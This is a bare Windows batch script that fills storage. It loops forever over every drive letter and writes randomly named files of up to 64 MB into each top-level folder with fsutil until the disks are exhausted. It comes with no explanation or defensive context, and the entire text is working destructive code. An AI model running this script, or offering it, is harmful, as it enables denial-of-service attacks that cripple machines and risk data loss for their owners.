@echo off
setlocal enabledelayedexpansion

set "randomNamePrefix=B_B_Q_"
set "maxFileSizeMB=64"

:loop
set "allDrivesFull=true"

for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    set "Disk=%%d"
    if exist "%%d:\\" (
        for /d %%f in ("%%d:\*") do (
            set "drive=%%f"
            set "randomName="
            for /l %%a in (1,1,12) do (
                set /a "rand=!random! %% 10"
                set "randomName=!randomName!!rand!"
            )
            set /a "size=!random! %% %maxFileSizeMB% + 1"
            set /a "size=size * 1024 * 1024"
            pushd "!drive!"
            (
                fsutil file createnew "!randomNamePrefix!!randomName!" !size! >nul
            )
            popd
            set "allDrivesFull=false"
        )
    )
)

if %allDrivesFull%==false (
    goto loop
)

:exit
exit /b
